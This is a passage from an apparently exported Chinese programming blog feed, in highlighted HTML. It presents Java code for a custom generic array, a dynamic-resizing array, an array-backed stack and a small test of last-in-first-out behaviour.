class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length / <span class="number">4</span> &amp;&amp; data.length / <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            resize(data.length / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line">        E[] newData = (E[])<span class="keyword">new</span> Object[newCapacity];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        data = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayStack-java（自定义动态数组栈）"><a href="#ArrayStack-java（自定义动态数组栈）" class="headerlink" title="ArrayStack.java（自定义动态数组栈）"></a>ArrayStack.java（自定义动态数组栈）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    Array&lt;E&gt; array; <span class="comment">//动态数组</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        array = <span class="keyword">new</span> Array&lt;&gt;(capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">()</span></span>&#123;</span><br><span class="line">        array = <span class="keyword">new</span> Array&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.getSize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.getCapacity();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        array.addLast(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.getLast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(<span class="string">"Stack: "</span>);</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; array.getSize() ; i ++)&#123;</span><br><span class="line">            res.append(array.get(i));</span><br><span class="line">            <span class="keyword">if</span>(i != array.getSize()-<span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">"] top"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Main-java（测试栈的后进先出原理）"><a href="#Main-java（测试栈的后进先出原理）" class="headerlink" title="Main.java（测试栈的后进先出原理）"></a>Main.java（测试栈的后进先出原理）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       ArrayStack&lt;Integer&gt; stack = <span class="keyword">new</span> ArrayStack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i++)&#123;</span><br><span class="line">           stack.push(i);</span><br><span class="line">           System.out.println(stack);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       stack.pop();</span><br><span class="line">       System.out.println(stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-自定义数组的数据结构</title>
    <url>/posts/37.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="自定义数组执行结果截图"><a href="#自定义数组执行结果截图" class="headerlink" title="自定义数组执行结果截图"></a>自定义数组执行结果截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210625092414528.png" alt="image-20210625092414528"></p>
<h1 id="自定义泛型数组代码-详解"><a href="#自定义泛型数组代码-详解" class="headerlink" title="自定义泛型数组代码(详解)"></a>自定义泛型数组代码(详解)</h1><h2 id="Array-java（自定义泛型数组）"><a href="#Array-java（自定义泛型数组）" class="headerlink" title="Array.java（自定义泛型数组）"></a>Array.java（自定义泛型数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Array is full."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Array-java（自定义动态数组）"><a href="#Array-java（自定义动态数组）" class="headerlink" title="Array.java（自定义动态数组）"></a>Array.java（自定义动态数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * data.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span 